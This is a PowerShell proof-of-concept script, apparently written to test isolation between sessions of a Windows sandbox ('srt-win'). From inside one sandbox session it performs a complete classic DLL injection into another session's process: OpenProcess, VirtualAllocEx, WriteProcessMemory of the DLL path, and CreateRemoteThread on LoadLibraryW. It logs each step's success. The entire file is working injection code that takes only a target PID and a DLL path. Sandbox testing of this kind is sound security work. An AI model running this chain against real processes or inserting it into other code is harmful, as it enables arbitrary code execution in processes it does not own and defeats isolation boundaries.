# Cross-sandbox-session DLL injection PoC.
# Runs INSIDE a sandboxed srt-win exec session (as the srt-sandbox user,
# restricted token). Attempts to OpenProcess + classic LoadLibrary-based
# DLL injection into a DIFFERENT srt-win exec session's child process
# (same shared srt-sandbox SID, different session).
param(
    [Parameter(Mandatory=$true)][int]$TargetPid,
    [Parameter(Mandatory=$true)][string]$DllPath
)

$code = @'
using System;
using System.Runtime.InteropServices;

public static class Inj {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

    // nSize / lpNumberOfBytesWritten are SIZE_T* in the real Win32 signature -
    // pointer-sized (8 bytes on x64). Using a 32-bit uint here mismatches the
    // native ABI on x64 and corrupts the call.
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UIntPtr nSize, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
'@
Add-Type -TypeDefinition $code -Language CSharp

$PROCESS_CREATE_THREAD    = 0x0002
$PROCESS_VM_OPERATION     = 0x0008
$PROCESS_VM_WRITE         = 0x0020
$PROCESS_VM_READ          = 0x0010
$PROCESS_QUERY_INFORMATION = 0x0400
$access = $PROCESS_CREATE_THREAD -bor $PROCESS_VM_OPERATION -bor $PROCESS_VM_WRITE -bor $PROCESS_VM_READ -bor $PROCESS_QUERY_INFORMATION
$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PAGE_READWRITE = 0x04

Write-Output "whoami: $(whoami)"
Write-Output "attempting OpenProcess(0x$($access.ToString('X')), pid=$TargetPid)"

$hProc = [Inj]::OpenProcess($access, $false, $TargetPid)
if ($hProc -eq [IntPtr]::Zero) {
    $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
    Write-Output "RESULT: OpenProcess FAILED, Win32 error=$err"
    exit 1
}
Write-Output "RESULT: OpenProcess SUCCEEDED - handle=$hProc (this alone demonstrates the cross-session access gap)"

$pathBytes = [System.Text.Encoding]::Unicode.GetBytes($DllPath + "`0")
Write-Output "DLL path byte length: $($pathBytes.Length)"
$remoteBuf = [Inj]::VirtualAllocEx($hProc, [IntPtr]::Zero, [UIntPtr]([uint64]$pathBytes.Length), ($MEM_COMMIT -bor $MEM_RESERVE), $PAGE_READWRITE)
$vaErr = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
Write-Output ("RESULT: VirtualAllocEx returned 0x{0:X} (GetLastError={1})" -f $remoteBuf.ToInt64(), $vaErr)
if ($remoteBuf -eq [IntPtr]::Zero) {
    [Inj]::CloseHandle($hProc) | Out-Null
    exit 1
}

[UIntPtr]$written = [UIntPtr]::Zero
$wrote = [Inj]::WriteProcessMemory($hProc, $remoteBuf, $pathBytes, [UIntPtr]([uint64]$pathBytes.Length), [ref]$written)
$wpmErr = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
Write-Output "RESULT: WriteProcessMemory returned $wrote, wrote=$($written.ToUInt64()) bytes, GetLastError=$wpmErr"
if (-not $wrote) {
    [Inj]::CloseHandle($hProc) | Out-Null
    exit 1
}
Write-Output "RESULT: WriteProcessMemory SUCCEEDED - wrote the DLL path into the PEER sandbox's process"

$hKernel32 = [Inj]::GetModuleHandle("kernel32.dll")
$pLoadLibraryW = [Inj]::GetProcAddress($hKernel32, "LoadLibraryW")
Write-Output "LoadLibraryW address: $pLoadLibraryW"

[IntPtr]$tid = [IntPtr]::Zero
$hThread = [Inj]::CreateRemoteThread($hProc, [IntPtr]::Zero, [UIntPtr]::Zero, $pLoadLibraryW, $remoteBuf, 0, [ref]$tid)
if ($hThread -eq [IntPtr]::Zero) {
    Write-Output "RESULT: CreateRemoteThread FAILED, Win32 error=$([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    exit 1
}
Write-Output "RESULT: CreateRemoteThread SUCCEEDED - thread=$hThread tid=$tid - code is now running inside the PEER sandbox's process"

[Inj]::WaitForSingleObject($hThread, 10000) | Out-Null
Write-Output "RESULT: remote thread finished (or timed out after 10s)"
[Inj]::CloseHandle($hThread) | Out-Null
[Inj]::CloseHandle($hProc) | Out-Null

Write-Output "DONE: full injection chain completed without any access-denied error"
